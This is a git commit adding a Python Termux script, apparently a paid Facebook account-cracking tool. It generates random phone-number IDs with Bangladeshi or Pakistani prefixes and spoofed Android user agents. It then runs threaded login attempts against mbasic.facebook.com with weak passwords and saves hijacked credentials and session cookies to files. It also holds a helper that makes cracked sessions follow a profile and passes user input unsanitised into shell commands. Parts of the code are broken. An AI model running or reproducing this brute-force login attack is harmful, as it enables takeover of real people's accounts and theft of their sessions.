ef217173920e710228edba9be60b1bc9b4bf2f9b
New User <121371908+i-hate-love@users.noreply.github.com>
2023-09-15 11:49:58 +0600

    E-0.py

---
+++ E-0.py
@@ -0,0 +1,335 @@
+#𝗪𝗢𝗥𝗞 𝗢𝗙𝗙 𝗘𝗛𝗖 LOVER 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵
+#𝗙𝗥𝗢𝗠 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛
+import os
+import sys
+import time
+import requests
+import uuid
+os.system('clear')
+def o():
+    os.system('clear')
+    print(logo)
+    ip = requests.get("https://api.ipify.org").text
+    jalan("     \033[97;1m[\033[92;1m+\033[97;1m] \033[38;5;46mYOUR IP ADDRESS\033[38;5;196m: \033[1;32m"+ip)
+    print("     \033[38;5;46m═━═━═━━═━═━━══━═━━\x1b[1;91m❴\033[47m\033[1;46mLOVER\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━\x1b[1;91m")
+    jalan("     \033[97;1m[\033[38;5;46mLOVER𝟭\033[97;1m] \033[97;1mWORK NOW RANDOM BD   ")
+    print("     \033[97;1m[\033[38;5;46mLOVER𝟮\033[97;1m] \033[95;1mCONTACT FOR ADMIN")
+    print("     \033[97;1m[\033[38;5;46mLOVER𝟯\033[97;1m] \033[92;1mFACEBOOK ")
+    LOVER = input('     \033[97;1m[\033[92;1mLOVER4\033[97;1m] \033[38;5;46mWORK MENU \033[38;5;196m: ')
+    if LOVER == 'LOVER1':
+        i()
+    if LOVER == 'LOVER2':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100081753736308&mibextid=ZbWKwL')
+    if LOVER == 'LOVER3':
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100081753736308&mibextid=ZbWKwL')
+    if LOVER == 'E':
+        os.system('exit')
+        return None
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    
+
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+            
+ 
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.040)
+
+def back():
+	login()
+LOVER="LOVER"
+imt="SETU"
+ak="CLASS3-"
+myid=uuid.uuid4().hex[:8].upper()
+try:
+	key1 = open('/storage/emulated/0/android8.txt', 'r').read()
+except:
+	kok=open('/storage/emulated/0/android8.txt', 'w')
+	kok.write(myid+imt)
+	kok.close()
+            
+RED = '\033[38;5;196m'#𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+WHITE = '\033[1;97m'#𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+GREEN = '\033[1;32m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+YELLOW = '\033[1;33m'#𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BLUE = '\033[1;34m'#𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+ORANGE = '\033[1;35m'#𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+P = '\x1b[1;97m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+M = '\x1b[1;91m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+H = '\x1b[1;92m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+K = '\x1b[1;93m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+B = '\x1b[1;94m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+U = '\x1b[1;95m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+O = '\x1b[1;96m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+N = '\x1b[0m'#𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER    
+A = '\x1b[1;90m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BN = '\x1b[1;107m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BBL = '\x1b[1;106m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BP = '\x1b[1;105m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BB = '\x1b[1;104m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BK = '\x1b[1;103m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BH = '\x1b[1;102m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BM = '\x1b[1;101m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+BA = '\x1b[1;100m' #𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 LOVER
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+bi = random.choice([M,N,K,B,U])
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+logo=("""
+\033[38;5;46m
+\033[38;5;46m██╗      ██████╗ ██╗   ██╗███████╗██████╗ 
+\033[38;5;46m██║     ██╔═══██╗██║   ██║██╔════╝██╔══██╗
+\033[38;5;46m██║     ██║   ██║██║   ██║█████╗  ██████╔╝
+\033[38;5;46m██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
+\033[38;5;46m███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
+\033[38;5;46m╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
+                                          
+\033[38;5;46m═━═━═━━═━═━━══━═━━═\x1b[1;91m❴\033[47m\033[1;46mLOVRE\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━══\x1b[1;91m""")
+try:
+    print("\033[38;5;46m\n asslamu alaikum\n")
+    print("\033[38;5;46m\n Update Tool\n")
+    print("\033[38;5;46m\nThanks For Using\n")    
+    time.sleep(2)
+    LOVER()
+    print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
+    LOVER()
+    v = 5.2
+    update = ('1.0')
+    update = ('1.0')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')
+
+
+loop = 0
+oks = []
+cps = []
+ 
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    v = 5.2
+    update = ('1.0')
+    update = ('1.0')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+ugen2=[]
+ugen=[]
+
+for xd in range(98605):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    
+def i():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("    \033[1;92m8 DIGIT \033[38;5;46mWORK NOW \033[97;1m[\033[38;5;46mLOVER\033[97;1m]")
+    print("    \033[38;5;46m═━═━═━━═━═━━══━═━━\x1b[1;91m❴\033[47m\033[1;46mLOVER\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━\x1b[1;91m")
+    print('    \033[97;1m[\033[92;1m•\033[97;1m]\033[1;97mPK SIM CODE   \033[38;5;196m:\033[1;97m 92301 92302 92303 92305')
+    print('    \033[97;1m[\033[92;1m•\033[97;1m]\033[1;97mBD SIM CODE    \033[38;5;196m:\033[1;97m 88016 88017 88018 88019')
+    print("    \033[38;5;46m═━═━═━━═━═━━══━═━━\x1b[1;91m❴\033[47m\033[1;46mLOVER\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━\x1b[1;91m")
+    code = input('    \033[38;5;196mINFUT CODEI \033[1;97m: ')
+    print("")
+    os.system('clear')
+    print(logo)
+    print("             \033[1;97m[\033[1;33mL I M I T  M E N U \033[1;97m]")
+    print("    \033[38;5;46m═━═━═━━═━═━━══━═━━\x1b[1;91m❴\033[47m\033[1;46mLOVER\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━\x1b[1;91m")
+    print("    \033[97;1m[\033[92;1m+\033[97;1m] \033[38;5;46mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
+    limit = int(input(" \033[97;1m[\033[92;1m?\033[97;1m] \033[38;5;46mFACEBOOK LIMIT  \033[38;5;196m: \033[1;32m"))
+    
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=50) as setu:
+        clear()
+        tl = str(len(user))
+        jalan('     \033[97;1m[\033[38;5;46mLOVER𝟭\033[97;1m] \033[38;5;46mAGENTS\033[38;5;196m: \033[1;32m'+str(len(ugen)))
+        jalan('     \033[97;1m[\033[38;5;46mLOVER𝟮\033[97;1m] \033[38;5;46mSIME CODE\033[38;5;196m: \033[1;32m'+code)
+        jalan('     \033[97;1m[\033[38;5;46mLOVER𝟯\033[97;1m] \033[38;5;46mFACEBOOK ID\033[38;5;196m: \033[1;32m'+tl)
+        print('     \033[97;1m[\033[38;5;46mLOVER𝟰\033[97;1m] \033[38;5;46mFILE SAVE \033[38;5;196m: \033[38;5;46mLOVER-OK.txt')
+        print('     \033[97;1m[\033[38;5;46mLOVER𝟱\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mLOVER-CP.txt')
+        print("    \033[38;5;46m═━═━═━━═━═━━══━═━━\x1b[1;91m❴\033[47m\033[1;46mLOVER BOY\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━\x1b[1;91m")
+        jalan("    \033[97;1m[\033[92;1mLOVER𝟲\033[97;1m] \033[38;5;46mBD \033[1;34m[\033[1;32mBANGLADESH\033[1;97m/\033[38;5;196mLOVER\033[1;34m] \033[1;97m")
+        jalan("    \033[97;1m[\033[92;1mLOVER𝟳\033[97;1m] \033[38;5;46mTERMUX COMMAND(LOVER)")
+        print("    \033[38;5;46m═━═━═━━═━═━━══━═━━\x1b[1;91m❴\033[47m\033[1;46mLOVER\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━━═━═━━\x1b[1;91m")
+        for love in user:
+            pwx = [love,'bangladesh','i love you']
+            uid = code+love
+            setu.submit(rcrack,uid,pwx,tl)
+    print('\n    TNX FOR LOVER COMMAND USED ')
+    print('\n    TNX FOR LOVER COMMAND USED  ')
+    print('\n    TNX FOR LOVER COMMAND USED  ')  
+def rcrack(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+            'method':'GET',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print('\033[38;5;46m[LOVER-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
+                open('/sdcard/LOVER-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print('\033[38;5;46m[LOVER-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
+                open('/sdcard/LOVER-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        brand=random.choice(['LOVER CYBER','LOVER-CYBER ','LOVER CRACK '])
+        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
+        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
+        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','??','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
+        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
+        sys.stdout.write(f"\r \33[1;90m[{colr}LOVER-BOY\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
+        sys.stdout.flush()
+        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mLOVER BOY{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+        sys.stdout.write('\r    \33[1;93m[\033[1;95mLOVER\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+
+
+def superuser():
+    UMO="LOVER"
+    uuid = str(os.geteuid()) + str(os.getlogin()) 
+    id = "5".join(uuid)
+    print(logo)
+    DARK=requests.get("https://github.com/i-hate-love/LOVER/blob/main/Approved.txt").text
+    if id in DARK:
+        Main()
+    else:
+          os.system("clear")
+          os.system("xdg-open https://www.facebook.com/profile.php?id=61550602840196")
+          time.sleep(3.0)
+              
+          os.system("clear")
+          print(logo)
+          print("\t\033[30m   [\033[1;32m\033[47m First Get Approvel\033[00m\033[1;30m]")
+          print ("")
+          print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
+          print ("")
+          print("                Your Key is Not Approved ")
+          print("               Copy And Send Key To Admin")
+          print ("")
+          print (" Your Key : "+UMO+id)
+          print ("\n")
+          os.system("espeak \"assalamualaikum ,I am EMON VAI er  ROBOT and my boss is EMON.Sir this tool is paid because 100% ok id just now login\"")
+          name = input(" Your Name : ")
+          os.system(f"espeak \"{name} ,prass Enter to send your key\"")
+          print ("")
+          input(" Press Enter To Send Key")
+          os.system("xdg-open https://www.facebook.com/profile.php?id=61550602840196")
+          superuser()        
+superuser()
